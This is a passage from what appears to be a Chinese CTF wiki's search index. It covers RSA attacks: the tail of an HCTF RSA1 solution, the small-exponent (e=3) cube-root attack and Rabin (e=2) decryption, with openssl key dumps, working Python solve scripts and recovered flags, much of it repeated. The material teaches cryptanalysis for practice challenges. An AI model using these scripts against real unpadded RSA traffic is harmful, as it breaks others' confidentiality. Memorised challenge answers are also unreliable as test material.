0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df flag = gmpy2 . powmod ( cipher , d , n ) print long_to_bytes ( flag ) \u5f97\u5230 flag true hctf { d8e8fca2dc0f896fd7cb4cb0031ba249 }","title":"2016 HCTF RSA1"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/","text":"\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 e \u7279\u522b\u5c0f\uff0c\u6bd4\u5982 e \u4e3a 3\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u5047\u8bbe\u7528\u6237\u4f7f\u7528\u7684\u5bc6\u94a5 e=3 e=3 \u3002\u8003\u8651\u5230\u52a0\u5bc6\u5173\u7cfb\u6ee1\u8db3\uff1a c\\equiv m^3 \\bmod N c\\equiv m^3 \\bmod N \u5219\uff1a \\begin{align*} m^3 &= c+k\\times N\\\\ m &= \\sqrt[3]{c+k\\times n} \\end{align*} \\begin{align*} m^3 &= c+k\\times N\\\\ m &= \\sqrt[3]{c+k\\times n} \\end{align*} \u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u5c0f\u5230\u5927\u679a\u4e3e k k \uff0c\u4f9d\u6b21\u5f00\u4e09\u6b21\u6839\uff0c\u76f4\u5230\u5f00\u51fa\u6574\u6570\u4e3a\u6b62\u3002 \u8303\u4f8b \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\uff0c\u9644\u4ef6\u4e2d\u6709\u4e00\u4e2a flag.enc \u548c pubkey.pem \uff0c\u5f88\u660e\u663e\u662f\u5bc6\u6587\u548c\u516c\u94a5\u4e86\uff0c\u5148\u7528 openssl \u8bfb\u4e00\u4e0b\u516c\u94a5\u3002 \u279c Jarvis OJ-Extremely hard RSA git: ( master ) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 4096 bit ) Modulus: 00 :b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6: 18 :fc:8c:7d:7d:03:b8:2e:40:99:51:c1:82:f3:98: de:e3:10:45:80:e7:ba:70:d3:83:ae:53:11:47:56: 56 :e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65: db:0b:12:2c:a4:0e:42:fa:70:91:89:b7:19:a4:f0: d7:46:e2:f6:06:9b:af:11:ce:bd:65:0f:14:b9:3c: 97 :73:52:fd:13:b1:ee:a6:d6:e1:da:77:55:02:ab: ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2: 05 :68:48:92:84:e1:81:f6:f1:1e:27:08:91:c8:ef: 80 :01:7b:ad:23:8e:36:30:39:a4:58:47:0f:17:49: 10 :1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15: 79 :c7:52:5a:69:98:4f:15:b5:66:7f:34:20:9b:70: eb:26:11:36:94:7f:a1:23:e5:49:df:ff:00:60:18: 83 :af:d9:36:fe:41:1e:00:6e:4e:93:d1:a0:0b:0f: ea:54:1b:bf:c8:c5:18:6c:b6:22:05:03:a9:4b:24: 13 :11:0d:64:0c:77:ea:54:ba:32:20:fc:8f:4c:c6: ce:77:15:1e:29:b3:e0:65:78:c4:78:bd:1b:eb:e0: 45 :89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca: d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86: 02 :c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc: dd:93:27:06:80:95:ef:a0:10:b7:f1:96:c7:4b:a8: c3:7b:12:8f:9e:14:11:75:16:33:f7:8b:7b:9e:56: f7:1f:77:a1:b4:da:ad:3f:c5:4b:5e:7e:f9:35:d9: a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5: c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4: 5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2: 08 :d8:ce:47:36:ba:39:a0:35:44:26:fa:e0:06:c7: fe:52:d5:26:7d:cf:b9:c3:88:4f:51:fd:df:df:4a: 97 :94:bc:fe:0e:15:57:11:37:49:e6:c8:ef:42:1d: ba:26:3a:ff:68:73:9c:e0:0e:d8:0f:d0:02:2e:f9: 2d:34:88:f7:6d:eb:62:bd:ef:7b:ea:60:26:f2:2a: 1d:25:aa:2a:92:d1:24:41:4a:80:21:fe:0c:17:4b: 98 :03:e6:bb:5f:ad:75:e1:86:a9:46:a1:72:80:77: 0f:12:43:f4:38:74:46:cc:ce:b2:22:2a:96:5c:c3: 0b:39:29 Exponent: 3 ( 0x3 ) Modulus = B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 writing RSA key -----BEGIN PUBLIC KEY----- MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4+nlp+jQC0kzVcYY /Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs pA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff 0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON Rjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH+hI+VJ3/8AYBiDr9k2/kEeAG5Ok9Gg Cw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF ie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG gJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl UitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE JvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC LvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP EkP0OHRGzM6yIiqWXMMLOSkCAQM = -----END PUBLIC KEY----- \u770b\u5230 e=3 e=3 \uff0c\u5f88\u660e\u663e\u662f\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb\u4e86\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 Crypto \u5e93\u6765\u8bfb\u53d6\u516c\u94a5\uff0c\u4f7f\u7528 multiprocessing \u6765\u52a0\u5feb\u7834\u89e3\u901f\u5ea6\u3002 #/usr/bin/python # coding=utf-8 import gmpy2 from Crypto.PublicKey import RSA from multiprocessing import Pool pool = Pool ( 4 ) with open ( './pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = int ( cipher , 16 ) def calc ( j ): print j a , b = gmpy2 . iroot ( cipher + j * N , 3 ) if b == 1 : m = a print '{:x}' . format ( int ( m )) . decode ( 'hex' ) pool . terminate () exit () def SmallE (): inputs = range ( 0 , 130000000 ) pool . map ( calc , inputs ) pool . close () pool . join () if __name__ == '__main__' : print 'start' SmallE () \u7206\u7834\u65f6\u95f4\u6709\u70b9\u957f\uff0c\uff0c\u62ff\u5230 flag Didn't you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: flag{Sm4ll_3xpon3nt_i5_W3ak} \u9898\u76ee \u00b6 RSA \u884d\u751f\u7b97\u6cd5\u2014\u2014Rabin \u7b97\u6cd5 \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 Rabin \u7b97\u6cd5\u7684\u7279\u5f81\u5728\u4e8e e=2 e=2 \u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u5bc6\u6587\uff1a c = m^2\\bmod n c = m^2\\bmod n \u89e3\u5bc6\uff1a \u8ba1\u7b97\u51fa m_p m_p \u548c m_q m_q \uff1a \\begin{align*} m_p &= \\sqrt{c} \\bmod p\\\\ m_q &= \\sqrt{c} \\bmod q \\end{align*} \\begin{align*} m_p &= \\sqrt{c} \\bmod p\\\\ m_q &= \\sqrt{c} \\bmod q \\end{align*} \u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u8ba1\u7b97\u51fa y_p y_p \u548c y_q y_q \uff1a y_p \\cdot p + y_q \\cdot q = 1 y_p \\cdot p + y_q \\cdot q = 1 \u89e3\u51fa\u56db\u4e2a\u660e\u6587\uff1a \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &= n - a\\\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &= n - c \\end{align*} \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &= n - a\\\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &= n - c \\end{align*} \u6ce8\u610f\uff1a\u5982\u679c p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 \uff0c\u5219 \\begin{align*} m_p &= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\ m_q &= c^{\\frac{1}{4}(q + 1)} \\bmod q \\end{align*} \\begin{align*} m_p &= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\ m_q &= c^{\\frac{1}{4}(q + 1)} \\bmod q \\end{align*} \u800c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 \u662f\u6ee1\u8db3\u7684\uff0c\u5bf9\u4e8e\u4e0d\u6ee1\u8db3\u7684\u60c5\u51b5\u4e0b\uff0c\u8bf7\u53c2\u8003\u76f8\u5e94\u7684\u7b97\u6cd5\u89e3\u51b3\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\u4e3a\u4f8b\uff0c\u8bfb\u4e00\u4e0b\u516c\u94a5\u3002 \u279c Jarvis OJ-hard RSA git: ( master ) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 :c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 2 ( 0x2 ) Modulus = C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr yigb/+l/vjDdAgEC -----END PUBLIC KEY----- e=2 e=2 \uff0c\u8003\u8651 Rabin \u7b97\u6cd5\u3002\u9996\u5148\u6211\u4eec\u5148\u5206\u89e3\u4e00\u4e0b p \u548c q\uff0c\u5f97\u5230 p=275127860351348928173285174381581152299 q=319576316814478949870590164193048041239 \u7f16\u5199\u4ee3\u7801 #!/usr/bin/python # coding=utf-8 import gmpy2 import string from Crypto.PublicKey import RSA # \u8bfb\u53d6\u516c\u94a5\u53c2\u6570 with open ( 'pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = string . atoi ( cipher , base = 16 ) # print cipher print \"please input p\" p = int ( raw_input (), 10 ) print 'please input q' q = int ( raw_input (), 10 ) # \u8ba1\u7b97yp\u548cyq inv_p = gmpy2 . invert ( p , q ) inv_q = gmpy2 . invert ( q , p ) # \u8ba1\u7b97mp\u548cmq mp = pow ( cipher , ( p + 1 ) / 4 , p ) mq = pow ( cipher , ( q + 1 ) / 4 , q ) # \u8ba1\u7b97a,b,c,d a = ( inv_p * p * mq + inv_q * q * mp ) % N b = N - int ( a ) c = ( inv_p * p * mq - inv_q * q * mp ) % N d = N - int ( c ) for i in ( a , b , c , d ): s = ' %x ' % i if len ( s ) % 2 != 0 : s = '0' + s print s . decode ( 'hex' ) \u62ff\u5230 flag\uff0c PCTF{sp3ci4l_rsa} \u3002 \u9898\u76ee \u00b6","title":"\u516c\u94a5\u6307\u6570\u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_1","text":"","title":"\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_2","text":"e \u7279\u522b\u5c0f\uff0c\u6bd4\u5982 e \u4e3a 3\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_3","text":"\u5047\u8bbe\u7528\u6237\u4f7f\u7528\u7684\u5bc6\u94a5 e=3 e=3 \u3002\u8003\u8651\u5230\u52a0\u5bc6\u5173\u7cfb\u6ee1\u8db3\uff1a c\\equiv m^3 \\bmod N c\\equiv m^3 \\bmod N \u5219\uff1a \\begin{align*} m^3 &= c+k\\times N\\\\ m &= \\sqrt[3]{c+k\\times n} \\end{align*} \\begin{align*} m^3 &= c+k\\times N\\\\ m &= \\sqrt[3]{c+k\\times n} \\end{align*} \u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u5c0f\u5230\u5927\u679a\u4e3e k k \uff0c\u4f9d\u6b21\u5f00\u4e09\u6b21\u6839\uff0c\u76f4\u5230\u5f00\u51fa\u6574\u6570\u4e3a\u6b62\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_4","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\uff0c\u9644\u4ef6\u4e2d\u6709\u4e00\u4e2a flag.enc \u548c pubkey.pem \uff0c\u5f88\u660e\u663e\u662f\u5bc6\u6587\u548c\u516c\u94a5\u4e86\uff0c\u5148\u7528 openssl \u8bfb\u4e00\u4e0b\u516c\u94a5\u3002 \u279c Jarvis OJ-Extremely hard RSA git: ( master ) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 4096 bit ) Modulus: 00 :b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6: 18 :fc:8c:7d:7d:03:b8:2e:40:99:51:c1:82:f3:98: de:e3:10:45:80:e7:ba:70:d3:83:ae:53:11:47:56: 56 :e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65: db:0b:12:2c:a4:0e:42:fa:70:91:89:b7:19:a4:f0: d7:46:e2:f6:06:9b:af:11:ce:bd:65:0f:14:b9:3c: 97 :73:52:fd:13:b1:ee:a6:d6:e1:da:77:55:02:ab: ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2: 05 :68:48:92:84:e1:81:f6:f1:1e:27:08:91:c8:ef: 80 :01:7b:ad:23:8e:36:30:39:a4:58:47:0f:17:49: 10 :1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15: 79 :c7:52:5a:69:98:4f:15:b5:66:7f:34:20:9b:70: eb:26:11:36:94:7f:a1:23:e5:49:df:ff:00:60:18: 83 :af:d9:36:fe:41:1e:00:6e:4e:93:d1:a0:0b:0f: ea:54:1b:bf:c8:c5:18:6c:b6:22:05:03:a9:4b:24: 13 :11:0d:64:0c:77:ea:54:ba:32:20:fc:8f:4c:c6: ce:77:15:1e:29:b3:e0:65:78:c4:78:bd:1b:eb:e0: 45 :89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca: d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86: 02 :c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc: dd:93:27:06:80:95:ef:a0:10:b7:f1:96:c7:4b:a8: c3:7b:12:8f:9e:14:11:75:16:33:f7:8b:7b:9e:56: f7:1f:77:a1:b4:da:ad:3f:c5:4b:5e:7e:f9:35:d9: a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5: c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4: 5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2: 08 :d8:ce:47:36:ba:39:a0:35:44:26:fa:e0:06:c7: fe:52:d5:26:7d:cf:b9:c3:88:4f:51:fd:df:df:4a: 97 :94:bc:fe:0e:15:57:11:37:49:e6:c8:ef:42:1d: ba:26:3a:ff:68:73:9c:e0:0e:d8:0f:d0:02:2e:f9: 2d:34:88:f7:6d:eb:62:bd:ef:7b:ea:60:26:f2:2a: 1d:25:aa:2a:92:d1:24:41:4a:80:21:fe:0c:17:4b: 98 :03:e6:bb:5f:ad:75:e1:86:a9:46:a1:72:80:77: 0f:12:43:f4:38:74:46:cc:ce:b2:22:2a:96:5c:c3: 0b:39:29 Exponent: 3 ( 0x3 ) Modulus = B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 writing RSA key -----BEGIN PUBLIC KEY----- MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4+nlp+jQC0kzVcYY /Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs pA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff 0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON Rjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH+hI+VJ3/8AYBiDr9k2/kEeAG5Ok9Gg Cw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF ie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG gJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl UitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE JvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC LvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP EkP0OHRGzM6yIiqWXMMLOSkCAQM = -----END PUBLIC KEY----- \u770b\u5230 e=3 e=3 \uff0c\u5f88\u660e\u663e\u662f\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb\u4e86\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 Crypto \u5e93\u6765\u8bfb\u53d6\u516c\u94a5\uff0c\u4f7f\u7528 multiprocessing \u6765\u52a0\u5feb\u7834\u89e3\u901f\u5ea6\u3002 #/usr/bin/python # coding=utf-8 import gmpy2 from Crypto.PublicKey import RSA from multiprocessing import Pool pool = Pool ( 4 ) with open ( './pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = int ( cipher , 16 ) def calc ( j ): print j a , b = gmpy2 . iroot ( cipher + j * N , 3 ) if b == 1 : m = a print '{:x}' . format ( int ( m )) . decode ( 'hex' ) pool . terminate () exit () def SmallE (): inputs = range ( 0 , 130000000 ) pool . map ( calc , inputs ) pool . close () pool . join () if __name__ == '__main__' : print 'start' SmallE () \u7206\u7834\u65f6\u95f4\u6709\u70b9\u957f\uff0c\uff0c\u62ff\u5230 flag Didn't you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: flag{Sm4ll_3xpon3nt_i5_W3ak}","title":"\u8303\u4f8b"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_5","text":"","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#rsa-rabin","text":"","title":"RSA \u884d\u751f\u7b97\u6cd5\u2014\u2014Rabin \u7b97\u6cd5"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_6","text":"Rabin \u7b97\u6cd5\u7684\u7279\u5f81\u5728\u4e8e e=2 e=2 \u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_7","text":"\u5bc6\u6587\uff1a c = m^2\\bmod n c = m^2\\bmod n \u89e3\u5bc6\uff1a \u8ba1\u7b97\u51fa m_p m_p \u548c m_q m_q \uff1a \\begin{align*} m_p &= \\sqrt{c} \\bmod p\\\\ m_q &= \\sqrt{c} \\bmod q \\end{align*} \\begin{align*} m_p &= \\sqrt{c} \\bmod p\\\\ m_q &= \\sqrt{c} \\bmod q \\end{align*} \u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u8ba1\u7b97\u51fa y_p y_p \u548c y_q y_q \uff1a y_p \\cdot p + y_q \\cdot q = 1 y_p \\cdot p + y_q \\cdot q = 1 \u89e3\u51fa\u56db\u4e2a\u660e\u6587\uff1a \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &= n - a\\\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &= n - c \\end{align*} \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &= n - a\\\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &= n - c \\end{align*} \u6ce8\u610f\uff1a\u5982\u679c p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 \uff0c\u5219 \\begin{align*} m_p &= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\ m_q &= c^{\\frac{1}{4}(q + 1)} \\bmod q \\end{align*} \\begin{align*} m_p &= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\ m_q &= c^{\\frac{1}{4}(q + 1)} \\bmod q \\end{align*} \u800c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 \u662f\u6ee1\u8db3\u7684\uff0c\u5bf9\u4e8e\u4e0d\u6ee1\u8db3\u7684\u60c5\u51b5\u4e0b\uff0c\u8bf7\u53c2\u8003\u76f8\u5e94\u7684\u7b97\u6cd5\u89e3\u51b3\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_8","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\u4e3a\u4f8b\uff0c\u8bfb\u4e00\u4e0b\u516c\u94a5\u3002 \u279c Jarvis OJ-hard RSA git: ( master ) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 :c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 2 ( 0x2 ) Modulus = C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr yigb/+l/vjDdAgEC -----END PUBLIC KEY----- e=2 e=2 \uff0c\u8003\u8651 Rabin \u7b97\u6cd5\u3002\u9996\u5148\u6211\u4eec\u5148\u5206\u89e3\u4e00\u4e0b p \u548c q\uff0c\u5f97\u5230 p=275127860351348928173285174381581152299 q=319576316814478949870590164193048041239 \u7f16\u5199\u4ee3\u7801 #!/usr/bin/python # coding=utf-8 import gmpy2 import string from Crypto.PublicKey import RSA # \u8bfb\u53d6\u516c\u94a5\u53c2\u6570 with open ( 'pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = string . atoi ( cipher , base = 16 ) # print cipher print \"please input p\" p = int ( raw_input (), 10 ) print 'please input q' q = int ( raw_input (), 10 ) # \u8ba1\u7b97yp\u548cyq inv_p = gmpy2 . invert ( p , q ) inv_q = gmpy2 . invert ( q , p ) # \u8ba1\u7b97mp\u548cmq mp = pow ( cipher , ( p + 1 ) / 4 , p ) mq = pow ( cipher , ( q + 1 ) / 4 , q ) # \u8ba1\u7b97a,b,c,d a = ( inv_p * p * mq + inv_q * q * mp ) % N b = N - int ( a ) c = ( inv_p * p * mq - inv_q * q * mp ) % N d = N - int ( c ) for i in ( a , b , c , d ): s = ' %x ' % i if len ( s ) % 2 != 0 : s = '0' + s print s . decode ( 'hex' ) \u62ff\u5230 flag\uff0c PCTF{sp3ci4l_rsa} \u3002","title":"\u4f8b\u5b50"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_9","text":"","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/","text":"\u66b4\u529b\u5206\u89e3 N \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5728 N 